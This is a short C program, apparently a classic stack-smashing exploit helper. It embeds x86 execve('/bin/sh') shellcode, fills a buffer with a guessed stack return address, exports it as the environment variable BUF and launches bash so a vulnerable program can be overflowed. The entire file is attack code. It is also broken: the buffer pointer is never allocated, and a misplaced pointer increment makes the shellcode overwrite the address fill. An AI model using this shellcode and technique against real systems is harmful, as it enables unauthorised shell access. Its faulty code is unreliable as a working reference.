#include <stdlib.h>

#define offset_size 0
#define buffer_size 512

char sc[] = 
    "\xEB\x1A\x5E\x31\xC0\x88\x46\x07\x8D\x1E\x89\x5E\x08\x89\x46"
    "\x0C\xB0\x0B\x89\xF3\x8D\x4E\x08\x8D\x56\x0C\xCD\x80\xE8\xE1"
    "\xFF\xFF\xFF\x2F\x62\x69\x6E\x2F\x73\x68";

unsigned long find_start()
{
    __asm__("movl %esp, %eax");
}

int main(int argc, char *argv[])
{
    char *buff, *ptr;
    long *addr_ptr, addr;
    int offset = offset_size, bsize = buffer_size;
    int i;

    if (argc > 1) bsize  =  atoi(argv[1]);
    if (argc > 2) offset =  atoi(argv[2]);

    addr = find_start() - offset;
    printf("Attemping address: 0x%X\n", addr);

    ptr = buff;
    addr_ptr = (long*)ptr;
    for (i = 0; i < bsize; i += 4)
        *(addr_ptr++) = addr;
    ptr += 4;

    for (i = 0; i < strlen(sc); i++)
        *(ptr++) = sc[i];
    buff[bsize - 1] = '\0';

    memcpy(buff, "BUF=", 4);
    putenv(buff);
    system("/bin/bash");
}
